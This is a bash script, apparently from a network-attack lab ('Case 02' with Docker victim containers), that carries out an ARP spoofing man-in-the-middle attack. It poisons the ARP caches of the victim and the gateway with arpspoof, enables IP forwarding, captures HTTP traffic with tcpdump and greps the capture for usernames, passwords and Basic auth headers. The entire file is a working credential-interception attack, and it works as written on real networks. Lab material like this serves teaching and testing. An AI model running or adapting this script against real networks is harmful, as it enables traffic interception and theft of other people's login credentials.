#!/bin/bash
# arp-mitm.sh — real ARP spoofing man-in-the-middle (Case 02).
#
# The attacker poisons the victim + gateway ARP caches, enables forwarding so
# the victim still works, and sniffs the HTTP POST that carries the login.
#
# Usage:
#   arp-mitm.sh <victim-ip> <gateway-ip> [seconds]
#     e.g. arp-mitm.sh 192.168.20.9 192.168.20.1 20
#
# While it runs, make the victim log in:
#   docker exec vb-victim sh login.sh 2>/dev/null;  # or:
#   docker exec vb-victim curl -d "username=admin&password=password&Login=Login" \
#     http://192.168.10.20/login.php
set -u

VICTIM="${1:?usage: arp-mitm.sh <victim-ip> <gateway-ip> [seconds]}"
GATEWAY="${2:?missing gateway-ip}"
DUR="${3:-20}"

PREFIX="${VICTIM%.*}"                 # subclass prefix, e.g. 192.168.20
IFACE=$(netif.sh "${PREFIX%.}." 2>/dev/null) || IFACE=""
NIC="${IFACE:-eth0}"

echo "[*] MITM on $NIC  victim=$VICTIM  gateway=$GATEWAY"
echo "[*] opening tcpdump (port 80) -> /tmp/mitm.pcap"

tcpdump -i "$NIC" -w /tmp/mitm.pcap "tcp port 80" &
TD=$!

sleep 1
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i "$NIC" -t "$VICTIM" "$GATEWAY" &
A1=$!
arpspoof -i "$NIC" -t "$GATEWAY" "$VICTIM" &
A2=$!

echo "[*] MITM is live for ${DUR}s — make the victim log in now."
sleep "$DUR"

kill "$A1" "$A2" 2>/dev/null; wait "$A1" "$A2" 2>/dev/null
echo 0 > /proc/sys/net/ipv4/ip_forward
kill "$TD" 2>/dev/null; wait "$TD" 2>/dev/null

echo
echo "[*] captured HTTP (search for Authorization / password in POST bodies):"
tcpdump -r /tmp/mitm.pcap -A -l 2>/dev/null \
  | tr '\r' '\n' \
  | grep -iE "Authorization: Basic|password=|username=|user=" | head -n 20
echo "[*] full capture: tcpdump -r /tmp/mitm.pcap -A | less"
echo "[*] done."